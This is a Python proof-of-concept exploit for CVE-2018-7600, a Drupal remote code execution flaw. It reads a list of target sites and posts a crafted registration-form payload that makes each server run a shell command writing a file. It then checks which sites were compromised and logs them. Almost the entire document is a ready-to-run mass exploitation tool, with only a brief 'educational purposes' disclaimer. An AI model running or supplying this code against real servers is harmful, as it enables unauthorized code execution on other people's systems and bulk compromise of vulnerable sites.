#!/usr/bin/env
import sys
import requests

print ('################################################################')
print ('# Proof-Of-Concept for CVE-2018-7600')
print ('# by Vitalii Rudnykh')
print ('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders')
print ('# https://github.com/a2u/CVE-2018-7600')
print ('################################################################')
print ('Provided only for educational or information purposes\n')

#put address in text file in the follwowing format:  https://domain.ltd/): ')
targets=''
targets = raw_input('Enter targets text file: ')
results = raw_input('Enter results text file: ')
endResults = raw_input('Enter end results text file: ')

try:

        fResults = open(results, 'w+')
        fEndResults = open(endResults, 'w+')




        with open(targets, "r") as f:
                for line in f:
                        url = line[:-1] + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
                        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo ";-)" | tee hello.html'}

                        r = requests.post(url, data=payload)
                        if r.status_code != 200:
                                print("Not exploitable")
                        else:
                                print (line[:-1]+'hello.html\n')
                                fResults.write(line[:-1]+'hello.html\n');
                                rcheck = requests.post(line[:-1]+'hello.html')
                                if rcheck.status_code==200:
                                        fEndResults.write(line[:-1]+'hello.html\n')


        fResults.close();
except IOError:
        print 'io error'
        fResults.close();
except:
        print("Unexpected error:", sys.exc_info()[0])
        fResults.close();
        raise




